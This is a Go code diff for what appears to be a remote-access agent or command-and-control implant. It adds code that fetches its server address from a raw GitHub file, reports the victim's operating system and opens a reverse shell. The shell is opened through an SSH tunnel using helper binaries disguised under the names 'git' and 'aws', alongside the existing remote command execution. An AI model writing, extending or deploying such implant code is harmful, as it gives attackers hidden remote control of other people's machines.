@@ -2,9 +2,13 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
+	"net/http"
 	"os/exec"
+	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
@@ -14,11 +18,13 @@ import (
 const secret = "EnCryp!e0?"
 
 type Agent struct {
-	isAuth bool
-	id     string
-	secret string
-	name   string
-	ws     *websocket.Conn
+	serverIp   string
+	serverPort string
+	isAuth     bool
+	id         string
+	secret     string
+	name       string
+	ws         *websocket.Conn
 }
 type Payload struct {
 	mode    string
@@ -30,12 +36,27 @@ type Payload struct {
 }
 
 func NewAgent() *Agent {
+	serverInfo := getServerInfo()
+	info := strings.Split(serverInfo, " ")
 	return &Agent{
-		isAuth: false,
-		id:     "",
-		secret: secret,
-		name:   "agent-" + RandomString(5),
+		serverIp:   info[0],
+		serverPort: info[1],
+		isAuth:     false,
+		id:         "",
+		secret:     secret,
+		name:       "agent-" + RandomString(5),
 	}
+}
+
+func getServerInfo() string {
+	resp, err := http.Get("https://raw.githubusercontent.com/devoxit/static/main/test.txt")
+	if err != nil {
+		// handle error
+	}
+	defer resp.Body.Close()
+	body, err := io.ReadAll(resp.Body)
+	fmt.Println(string(body))
+	return string(body)
 }
 
 func NewPayload() *Payload {
@@ -96,18 +117,28 @@ func (a *Agent) msgHandler(msg string) {
 	payload.parser(msg)
 	fmt.Println(*payload)
 	if a.isAuth != true && payload.mode != "authResponse" {
-		fmt.Println("----------------here---------------\n", a.isAuth, payload.mode)
 		a.authReq()
 	}
 	switch payload.mode {
 	case "cmd":
 		a.handleCmd(payload)
+		break
 	case "authResponse":
 		a.handleAuthRes(payload)
+		break
 	case "msg":
 		a.handleMsg(payload)
+		break
 	case "ping":
 		a.handlePing(payload)
+		break
+	case "os":
+		a.handleOs(payload)
+		break
+
+	case "rs":
+		a.handleRs(payload)
+		break
 	}
 
 }
@@ -132,7 +163,6 @@ func (a *Agent) handleAuthRes(payload *Payload) {
 		data := strings.Split(payload.content, "/")
 		a.isAuth = true
 		a.id = data[0]
-		fmt.Println("+++++++++++++auth+++++++++++++\n", a.isAuth, payload.mode)
 	}
 }
 
@@ -151,16 +181,39 @@ func (a *Agent) handleCmd(payload *Payload) {
 }
 
 func (a *Agent) handleMsg(payload *Payload) {
-	if payload.mode != "ping" {
+	if payload.mode != "msg" {
 		return
 	}
 	send("/msg: well recived -> "+payload.from, a.ws)
 }
 
+func (a *Agent) handleOs(payload *Payload) {
+	if payload.mode != "os" {
+		return
+	}
+	fmt.Println(runtime.GOOS)
+	send("/msg: "+runtime.GOOS+" -> "+payload.from, a.ws)
+}
+
+func (a *Agent) handleRs(payload *Payload) {
+	if payload.mode != "rs" {
+		return
+	}
+	args := strings.Split(payload.content, " ")
+	shell := args[0]
+	params := args[1:payload.length]
+	intport := strconv.Itoa(9600 + rand.Intn(100))
+	command := "-NL " + intport + ":" + params[1] + ":" + params[2] + " " + params[3] + "@" + params[4] + " -p " + a.secret
+	fmt.Println(shell, params)
+	connectToRs(command, shell, intport)
+	send("/msg: "+runtime.GOOS+" -> "+payload.from, a.ws)
+}
+
 func main() {
-	origin := "http://localhost/"
-	url := "ws://localhost:3200/ws"
 	agent := NewAgent()
+	origin := "http://" + agent.serverIp
+	url := "ws://" + agent.serverIp + ":" + agent.serverPort + "/ws"
+
 	agent.connect(url, origin)
 }
 
@@ -189,15 +242,23 @@ func (p *Payload) parser(str string) {
 	case "[cmd]":
 		p.mode = "cmd"
 		p.cmdParser(args[1])
+		break
 	case "[auth]":
 		p.mode = "authResponse"
 		p.authResParser(args[1])
+		break
 	case "[ping]":
 		p.mode = "ping"
 		p.pingParser(args[1])
+		break
+	case "[os]":
+		p.mode = "os"
+		p.osParser(args[1])
+		break
 	case "[rs]":
 		p.mode = "rs"
 		p.rsParser(args[1])
+		break
 	default:
 		p.mode = "msg"
 		p.msgParser(str)
@@ -237,21 +298,52 @@ func (p *Payload) msgParser(str string) {
 	}
 }
 
+func (p *Payload) osParser(str string) {
+	p.from = str
+	p.length = 1
+}
+
 func (p *Payload) rsParser(str string) {
+	args := strings.Split(str, " <- ")
+	p.args = args
+	p.length = len(args)
+	p.content = args[0]
+	p.from = args[1]
+}
+
+func connectToRs(params string, shell string, intport string) bool {
+	//create ssh tunnel
+	go createTunnel(params)
+	//sleep 5s
+	time.Sleep(time.Millisecond * 3000)
+	// find shell type
+	//spin the shell executor
+	_shell := exec.Command("./aws"+extension(), "localhost", intport, shell)
+	err := _shell.Run()
+	if err != nil {
+		return true
+	}
+	return false
+}
+
+func createTunnel(command string) {
+	args := strings.Split(command, " ")
+	_tunnel := exec.Command("./git"+extension(), args...)
+	err := _tunnel.Run()
+	if err != nil {
+		fmt.Println(err)
+	}
 
 }
 
-func connectToRs(shell string, params []string) int {
-	//create ssh tunnel
-	_tunnel := exec.Command("git", params...)
-	go _tunnel.Run()
-	//sleep 5s
-	time.Sleep(time.Millisecond * 3000)
-	//spin the shell executor
-	_shell := exec.Command("aws", "localhost", "9565", shell)
-	err := _shell.Run()
-	if err != nil {
-		return -1
+func extension() string {
+	os := runtime.GOOS
+	if os == "windows" {
+		return ".exe"
 	}
-	return 0
+
+	if os == "linux" {
+		return ".sh"
+	}
+	return ""
 }
